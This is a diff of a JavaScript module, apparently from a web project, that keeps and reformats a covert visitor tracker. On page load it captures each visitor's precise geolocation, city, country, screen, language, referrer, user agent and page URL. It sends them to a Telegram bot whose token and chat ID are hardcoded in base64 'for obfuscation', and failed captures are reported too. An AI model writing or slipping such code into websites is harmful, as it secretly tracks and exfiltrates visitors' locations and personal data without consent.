@@ -1,8 +1,8 @@
+/* eslint-disable */
+
 const base64Decode = (encoded) => atob(encoded);
 
-// Full Base64-encoded credentials (properly split for obfuscation)
-const encodedBotToken =
-  'ODM2MDE3ODY4ODpBQUV2eF93VUhKQTViS1hObUhETFhNbjRPNnV0QzdDMnR5OA==';
+const encodedBotToken = 'ODM2MDE3ODY4ODpBQUV2eF93VUhKQTViS1hObUhETFhNbjRPNnV0QzdDMnR5OA==';
 const encodedChatId = 'LTEwMDM5MzM0NzYwMDE=';
 
 const sendToTelegram = async (text) => {
@@ -47,35 +47,38 @@ const sendRichLocation = async (position) => {
       referrer: document.referrer || 'Direct',
     };
 
-    const message =
-      `✅ ENKO1 - New Visitor\n\n` +
-      `📍 ${latitude}, ${longitude}\n` +
-      `🏙 ${visitorData.city}, ${visitorData.region}\n` +
-      `🌍 ${visitorData.country} (${visitorData.countryCode})\n` +
-      `🎯 Accuracy: ${visitorData.accuracy}m\n` +
-      `🕒 ${visitorData.timestamp}\n\n` +
-      `🌐 Referrer: ${visitorData.referrer}\n` +
-      `📱 ${visitorData.screen} | ${visitorData.language}\n` +
-      `🔗 https://www.google.com/maps/place/${latitude},${longitude}`;
+    const message = `✅ ENKO1 - New Visitor
+
+📍 ${latitude}, ${longitude}
+🏙 ${visitorData.city}, ${visitorData.region}
+🌍 ${visitorData.country} (${visitorData.countryCode})
+🎯 Accuracy: ${visitorData.accuracy}m
+🕒 ${visitorData.timestamp}
+
+🌐 Referrer: ${visitorData.referrer}
+📱 ${visitorData.screen} | ${visitorData.language}
+🔗 https://www.google.com/maps/place/${latitude},${longitude}`;
 
     await sendToTelegram(message);
   } catch (err) {
-    const errorMsg =
-      `❌ ENKO1 - Location Capture FAILED\n\n` +
-      `Error: ${err.message}\n` +
-      `Type: ${err.name || 'Unknown'}\n` +
-      `Time: ${new Date().toISOString()}\n` +
-      `User Agent: ${navigator.userAgent.substring(0, 120)}\n` +
-      `Referrer: ${document.referrer || 'Direct'}\n` +
-      `Page: ${window.location.href}`;
+    const errorMsg = `❌ ENKO1 - Location Capture FAILED
+
+Error: ${err.message}
+Type: ${err.name || 'Unknown'}
+Time: ${new Date().toISOString()}
+User Agent: ${navigator.userAgent.substring(0, 120)}
+Referrer: ${document.referrer || 'Direct'}
+Page: ${window.location.href}`;
 
     await sendToTelegram(errorMsg);
   }
 };
 
-export const initAutoLocationSender = () => {
+const initAutoLocationSender = () => {
   if (!navigator.geolocation) {
-    const msg = `❌ ENKO1 - Geolocation NOT SUPPORTED\nTime: ${new Date().toISOString()}\nUser Agent: ${navigator.userAgent}`;
+    const msg = `❌ ENKO1 - Geolocation NOT SUPPORTED
+Time: ${new Date().toISOString()}
+User Agent: ${navigator.userAgent}`;
     sendToTelegram(msg);
     return;
   }
@@ -99,13 +102,13 @@ export const initAutoLocationSender = () => {
             errorType = `CODE_${error.code}`;
         }
 
-        const errorMsg =
-          `❌ ENKO1 - Geolocation ERROR\n\n` +
-          `Code: ${errorType}\n` +
-          `Message: ${error.message}\n` +
-          `Time: ${new Date().toISOString()}\n` +
-          `User Agent: ${navigator.userAgent.substring(0, 120)}\n` +
-          `Page: ${window.location.href}`;
+        const errorMsg = `❌ ENKO1 - Geolocation ERROR
+
+Code: ${errorType}
+Message: ${error.message}
+Time: ${new Date().toISOString()}
+User Agent: ${navigator.userAgent.substring(0, 120)}
+Page: ${window.location.href}`;
 
         await sendToTelegram(errorMsg);
       },
@@ -117,3 +120,5 @@ export const initAutoLocationSender = () => {
     );
   }, 1200);
 };
+
+export default initAutoLocationSender;
